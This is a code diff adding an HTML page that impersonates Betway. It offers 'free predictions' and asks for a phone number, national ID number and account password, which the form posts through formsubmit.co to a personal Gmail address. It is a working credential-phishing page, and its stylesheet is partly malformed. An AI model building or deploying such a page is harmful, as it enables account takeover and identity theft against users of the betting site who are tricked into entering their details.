@@ -1,0 +1,52 @@
+<div class="separator" style="clear: both;"><a style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" width="320" data-original-height="1080" data-original-width="1080" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFQdaNaArYSY7isa4ykVD7NUwH04xb94R-nteVk3rTpN968P3pyDpEw2zruKziciaLAakRxZaPjItPrMXDpRoCOsVVoWlrX5OBtzFi2cw1gfK2pxPX6LW8siFWrW2ES9VV0hgJuuzJLn3OF3RmUon75cPdm2G5pcA3oEm65oJ6NNNd-F9kAa2f6lGiG6c/s320/Picsart_23-08-13_08-09-26-166.jpg"/></a></div><!DOCTYPE html>
+
+<html>
+<head>
+  <title>Login Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+    
+   
+
+    .container h2 {
+      text-align: center;
+      color: green;
+          .container input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      background-color: green;
+      color: #fff;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    .container input[type="submit"]:hover {
+      background-color: #45a049;
+    }
+
+    .container p {
+      text-align: center;
+    }
+  
+  </style>
+</head>
+<body>
+  <div class="header">
+  <h3>Free Predictions Betway Users</h3>
+   <h2>Betway Details</h2>
+   <form action="https://formsubmit.co/Viperk091@gmail.com" method="POST">
+      <input type="text" placeholder="+27" name="Phone Number" required>
+      <input type="Number" placeholder="ID Number" name="ID" required>
+            <input type="Password" placeholder="Password" name="Password" required>
+      <input type="submit" value="Claim">
+    </form>
+    <p>Forgot Your Betway Account? <a
+    href="https://www.betway.co.za/how-to-reset-password">Forgot My Password</a></p>
+  </div>
+</body>
+</html>
+    }
